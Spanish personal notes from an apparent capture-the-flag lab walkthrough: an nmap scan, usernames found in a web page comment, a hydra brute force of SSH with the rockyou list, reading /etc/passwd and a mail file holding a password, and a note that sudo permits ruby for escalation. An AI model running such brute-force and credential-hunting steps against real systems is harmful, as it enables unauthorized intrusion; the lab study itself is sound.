realizamos ping

realizamos nmap -p- --open -n -PN -sS -A --min-rate 5000 -vvv ip

observamos el puerto 22 y el puerto 80

puerto 80 corriendo un apache asi que vamos a su web, pagina en blanco, observamosel codigo de la web y vemosun comentari que pone, de juan para camilo, dos usuairos potenciales, asiq ue haremos un ataque de fuerza bruta con estos dos al otro puerto abierto conn estos usuarios como entrada

nano users.txt

Camilo
camilo
Juan
juan

hydra -L users -P /usr/share/wordlists/rockyou.txt ssh://ip

si tuviramos algun usuairio o contraseña con la letra en minuscula

![[Pasted image 20260103162042.png]]
conectamos al usuario camilo por ssh

password1


ssh camilo@ip

whoami

sudo -l (sudoers), no forma parte del sudo

cat/etc/passwd

vemos juan y pedro

buscamos alguna carpeta por el contenedor , en este caso de mail, por lo que observamos antes

find /* -name mail 2>/dev/null

observamos dos carpetas

entramos en var/mail con cat

hay un archivo txt
![[Pasted image 20260103162337.png]]


2k84dicb


añadimos pedro a nuestro texto llamado users.txt y borramos camilo, y tenemos la contraseña por lo que no usaremos diccionario de contraseña
![[Pasted image 20260103162454.png]]
![[Pasted image 20260103162520.png]]

sudo -l

podemos usar ruby sin ser privilegadio

gfbions

![[Pasted image 20260103162611.png]]

